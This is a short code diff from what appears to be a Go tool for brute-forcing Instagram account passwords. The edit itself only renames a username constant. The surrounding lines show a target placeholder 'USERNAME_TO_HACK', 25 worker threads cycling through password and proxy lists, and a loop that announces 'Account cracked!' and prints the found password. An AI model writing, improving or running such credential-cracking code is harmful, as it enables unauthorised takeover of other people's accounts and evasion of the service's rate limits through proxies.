@@ -12,7 +12,7 @@ import (
 	"github.com/ahmdrz/goinsta"
 )
 
-const username string = "USERNAME_TO_HACK"
+const USERNAME string = "USERNAME_TO_HACK"
 const WORKERS int = 25
 const VERBOSE bool = false
 
@@ -62,7 +62,7 @@ func welcomeMessage() {
 }
 
 func initializedMessage() {
-	fmt.Println("\nTarget:", username)
+	fmt.Println("\nTarget:", USERNAME)
 	fmt.Println("Passwords:", len(passwords))
 	fmt.Println("Proxies:", len(proxies))
 	fmt.Println("Threads:", WORKERS)
@@ -144,15 +144,15 @@ func workerThread(workerNumber int) {
 		password := pop(&passwords)
 
 		// Test login informaton
-		result := login(username, password, "http://"+proxy, workerNumber)
+		result := login(USERNAME, password, "http://"+proxy, workerNumber)
 
 		if result == 0 {
 			/*
 			 *	Account cracked!
 			 */
 			fmt.Println("\n\nWorker #", workerNumber, "has cracked the account!")
-			fmt.Println("Username:", username+"\n"+
-				"Password:", password+"\n")
+			fmt.Println("Username:", USERNAME + "\n" +
+									"Password:", password + "\n")
 			os.Exit(0)
 		} else if result == 2 {
 			/*
